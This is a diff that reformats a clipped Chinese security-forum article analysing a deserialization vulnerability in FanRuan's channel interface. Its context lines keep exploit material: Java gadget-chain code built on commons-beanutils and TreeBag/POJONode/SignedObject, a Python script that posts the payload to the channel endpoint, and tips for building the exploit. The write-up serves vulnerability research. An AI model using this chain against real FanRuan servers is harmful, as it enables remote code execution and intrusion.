@@ -1,5 +1,5 @@
 ---
-title: 奇安信攻防社区-帆软channel接口反序列化漏洞分析
+title: 奇安信攻防社区 - 帆软 channel 接口反序列化漏洞分析
 url: https://forum.butian.net/share/2806
 clipped_at: 2024-03-26 23:08:09
 category: default
@@ -8,7 +8,7 @@ tags:
 ---
 
 
-# 奇安信攻防社区-帆软channel接口反序列化漏洞分析
+# 奇安信攻防社区 - 帆软 channel 接口反序列化漏洞分析
 
 ### 环境
 
@@ -134,7 +134,7 @@ public class CB_not_cc {
         ObjectOutputStream oos = new ObjectOutputStream(baos);
         oos.writeObject(queue);
 
-        // 包装成ZIP
+        // 包装成 ZIP
         final ByteArrayOutputStream baos3 = new ByteArrayOutputStream();
         final GZIPOutputStream gos3 = new GZIPOutputStream(baos3);
         gos3.write(baos.toByteArray());
@@ -156,7 +156,7 @@ public class CB_not_cc {
 
 ![image.png](assets/1711465689-9a292eb8095d3afaeea450ad8d15598d.png)
 
-通过py脚本利用
+通过 py 脚本利用
 
 ```python
 import requests,base64
@@ -171,7 +171,7 @@ res = requests.post(url=host+"/webroot/decision/remote/design/channel", data=dat
 print(res.text)
 ```
 
-不过这里发现一个问题，当使用`commons-beanutils 1.9.2` 生成反序列化数据提交不会利用成功，通过arthas调试会发现报错`java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962`，这是由于`commons-beanutils`版本跟帆软环境中的不一致造成的，将生成序列化数据的环境从`1.9.2`换到`1.8.3`即可。
+不过这里发现一个问题，当使用`commons-beanutils 1.9.2` 生成反序列化数据提交不会利用成功，通过 arthas 调试会发现报错`java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962`，这是由于`commons-beanutils`版本跟帆软环境中的不一致造成的，将生成序列化数据的环境从`1.9.2`换到`1.8.3`即可。
 
 ![image.png](assets/1711465689-30bd89951038c03cfd6e089e021304d1.png)
 
@@ -204,7 +204,7 @@ print(res.text)
 
 ![image.png](assets/1711465689-b030f08afc41ca60a1ab2fd6459bbe49.png)
 
-那么通过`SignedObject`这个类，可以将某个利用链，如CB链触发点`PriorityQueue`对象，作为参数传递进去，再找到一条路径调用`getObject`方法，便可以实现二次反序列化。
+那么通过`SignedObject`这个类，可以将某个利用链，如 CB 链触发点`PriorityQueue`对象，作为参数传递进去，再找到一条路径调用`getObject`方法，便可以实现二次反序列化。
 
 `getObject`属于`getter`方法，在`fastjson`中，对一个类进行序列化会自动调用该类的`静态代码块`、`构造方法`、`getter`方法。
 
@@ -222,11 +222,11 @@ print(res.text)
 
 ![image.png](assets/1711465689-8dc6ade1239336e9e60273bb9bbfbcee.png)
 
-`BaseJsonNode`类被18个子类继承。
+`BaseJsonNode`类被 18 个子类继承。
 
 ![image.png](assets/1711465689-689b449afece0a2283b8d6b0893d3949.png)
 
-在这个18个子类中，只有`POJONode`类的构造方法能传入`Object`对象。
+在这个 18 个子类中，只有`POJONode`类的构造方法能传入`Object`对象。
 
 ![image.png](assets/1711465689-3dfb021073f060b09efd8e4242777a35.png)  
 这里，我们将`SignedObject`对象作为参数，创建一个`POJONode`对象，并调用其`toString`方法，并在`SignedObject`的`getObject`中打上断点，运行便调用到了该方法。
@@ -311,14 +311,14 @@ org.apache.commons.collections.bag.TreeBag#readObject
                 org.freehep.util.VersionComparator#compare
                     com.fr.third.fasterxml.jackson.databind.node.POJONode#toString
                         java.security.SignedObject#getObject
-                            // 二次反序列化利用CB链
+                            // 二次反序列化利用 CB 链
 ```
 
 #### 坑点
 
 在构造利用链的时候遇到的一些问题。
 
-##### add添加`POJONode`对象坑点
+##### add 添加`POJONode`对象坑点
 
 在序列化`TreeBag`类的时候，需要`add`添加被触发的`POJONode`对象，但是执行`add`会提前触发漏洞执行，为了防止提前触发漏洞，需要先`add`一个无关紧要的对象，然后再通过反射修改数据为`POJONode`对象。
 
@@ -336,7 +336,7 @@ key.setAccessible(true);
 key.set(mapEnter, node);
 ```
 
-##### 执行writeObject会自动触发调用
+##### 执行 writeObject 会自动触发调用
 
 当按照调用链，把整条链子构造出来，执行`writeObject`序列化的时候，会提前触发调用，并且会报错，导致序列化后的数据不能正常生成。
 
@@ -355,7 +355,7 @@ ctClass.removeMethod(writeReplace);
 ctClass.toClass();
 ```
 
-#### 生成exp
+#### 生成 exp
 
 ```java
 package example;
@@ -447,7 +447,7 @@ public class Test {
         final TreeBag treeBag = new TreeBag(classComparator);
         treeBag.add(-1);
 
-        // 反射修改 root 属性的key
+        // 反射修改 root 属性的 key
         final Class&lt;?&gt; superclass = treeBag.getClass().getSuperclass();
         final Field map = superclass.getDeclaredField("map");
         map.setAccessible(true);
